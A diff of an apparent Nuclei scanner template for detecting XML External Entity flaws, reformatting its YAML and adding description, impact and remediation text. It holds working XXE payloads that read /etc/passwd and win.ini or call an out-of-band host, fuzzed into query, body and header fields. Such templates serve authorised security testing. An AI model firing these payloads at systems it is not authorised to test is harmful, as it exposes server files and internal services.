@@ -1,84 +1,121 @@
 id: generic-xxe
-
 info:
   name: Generic XML External Entity - (XXE)
   author: pwnhxl,AmirHossein Raeisi
   severity: medium
   reference:
-    - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
+  - https://github.com/andresriancho/w3af/blob/master/w3af/plugins/audit/xxe.py
   metadata:
     max-request: 2
   tags: dast,xxe
+  description: The Generic XML External Entity (XXE) vulnerability is a critical security
+    flaw that can arise when an application processes XML input without properly validating
+    or sanitizing it. This vulnerability occurs when the XML parser is enabled to
+    access external entities, which can allow an attacker to read local files, access
+    sensitive data, execute remote commands, or even perform denial-of-service attacks.
+    The impact of an XXE vulnerability can be severe, as it can lead to the exposure
+    of sensitive information, data leakage, and the potential compromise of the entire
+    system. Mitigating this vulnerability requires implementing proper input validation,
+    disabling external entity resolution, and keeping XML parsers up-to-date with
+    the latest security patches. Addressing XXE vulnerabilities is crucial for maintaining
+    the overall security and integrity of web applications that process XML input.
+  impact: '- Unauthorized access to local files on the server, potentially exposing
+    sensitive data such as configuration files, database credentials, or other sensitive
+    information
 
+    - Ability to execute remote commands on the server, leading to complete system
+    compromise and the potential for further attacks
+
+    - Potential for denial-of-service attacks by triggering the XML parser to process
+    malformed XML documents, causing the application to crash or become unresponsive
+
+    - Possibility of initiating network requests to internal systems or services,
+    potentially leading to data theft or unauthorized access to restricted resources
+
+    - Potential for information disclosure through the retrieval of sensitive data
+    from the server, such as user credentials, private messages, or financial information'
+  remediation: 'To address the Generic XML External Entity (XXE) vulnerability, developers
+    should disable external entity resolution and implement proper input validation
+    for all XML input. This can be achieved by following these steps:
+
+
+    - Disable external entity resolution in the XML parser configuration. This will
+    prevent the parser from attempting to resolve external entities, which is a common
+    attack vector for XXE vulnerabilities.
+
+    - Implement robust input validation and sanitization for all XML input, ensuring
+    that any user-supplied data is properly escaped or sanitized before being processed
+    by the XML parser.
+
+    - Keep the XML parser and associated libraries up-to-date with the latest security
+    patches to address known vulnerabilities and maintain the overall security of
+    the application.
+
+    - Consider using a whitelist approach to define the specific elements, attributes,
+    and entities that are allowed in the XML input, and reject any input that does
+    not conform to the whitelisted rules.
+
+    - Implement additional security measures, such as input length checks, character
+    encoding, and input normalization, to further mitigate the risk of XXE vulnerabilities.'
 variables:
-  rletter: "{{rand_base(6,'abc')}}"
-
+  rletter: '{{rand_base(6,''abc'')}}'
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
-          - 'method == "POST"'
-
-    payloads:
-      xxe:
-        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{rletter}};</x>'
-        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>'
-        - '<!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{rletter}};</x>'
-
-    fuzzing:
-      - part: query
-        keys-regex:
-          - "(.*?)xml(.*?)"
-        fuzz:
-          - "{{xxe}}"
-
-      - part: query
-        values:
-          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
-        fuzz:
-          - "{{xxe}}"
-
-      - part: body
-        keys-regex:
-          - "(.*?)xml(.*?)"
-        fuzz:
-          - "{{xxe}}"
-
-      - part: body
-        values:
-          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
-        fuzz:
-          - "{{xxe}}"
-
-      - part: header
-        keys-regex:
-          - "(.*?)xml(.*?)"
-        fuzz:
-          - "{{xxe}}"
-
-      - part: header
-        values:
-          - "(<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>"
-        fuzz:
-          - "{{xxe}}"
-
-    stop-at-first-match: true
-    matchers:
-      - type: regex
-        name: linux
-        part: body
-        regex:
-          - 'root:.*?:[0-9]*:[0-9]*:'
-
-      - type: word
-        name: windows
-        part: body
-        words:
-          - 'for 16-bit app support'
-
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "http"
-# digest: 4b0a00483046022100f4bbfc3971586034fe4acec998d83906a5475082576c1188c48196e212dd6147022100acbeef0ac9677e9e0e5665a5181eb75b9d52bd56103b81a525ba9b9c307e566c:922c64590222798bb761d5b6d8e72950
+- pre-condition:
+  - type: dsl
+    dsl:
+    - method == "GET"
+    - method == "POST"
+  payloads:
+    xxe:
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:///c:/windows/win.ini">
+      ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "file:////etc/passwd"> ]><x>&{{rletter}};</x>
+    - <!DOCTYPE {{rletter}} [ <!ENTITY {{rletter}} SYSTEM "http://{{interactsh-url}}">
+      ]><x>&{{rletter}};</x>
+  fuzzing:
+  - part: query
+    keys-regex:
+    - (.*?)xml(.*?)
+    fuzz:
+    - '{{xxe}}'
+  - part: query
+    values:
+    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
+    fuzz:
+    - '{{xxe}}'
+  - part: body
+    keys-regex:
+    - (.*?)xml(.*?)
+    fuzz:
+    - '{{xxe}}'
+  - part: body
+    values:
+    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
+    fuzz:
+    - '{{xxe}}'
+  - part: header
+    keys-regex:
+    - (.*?)xml(.*?)
+    fuzz:
+    - '{{xxe}}'
+  - part: header
+    values:
+    - (<!DOCTYPE|<?xml|%3C!DOCTYPE|%3C%3Fxml)(.*?)>
+    fuzz:
+    - '{{xxe}}'
+  stop-at-first-match: true
+  matchers:
+  - type: regex
+    name: linux
+    part: body
+    regex:
+    - 'root:.*?:[0-9]*:[0-9]*:'
+  - type: word
+    name: windows
+    part: body
+    words:
+    - for 16-bit app support
+  - type: word
+    part: interactsh_protocol
+    words:
+    - http
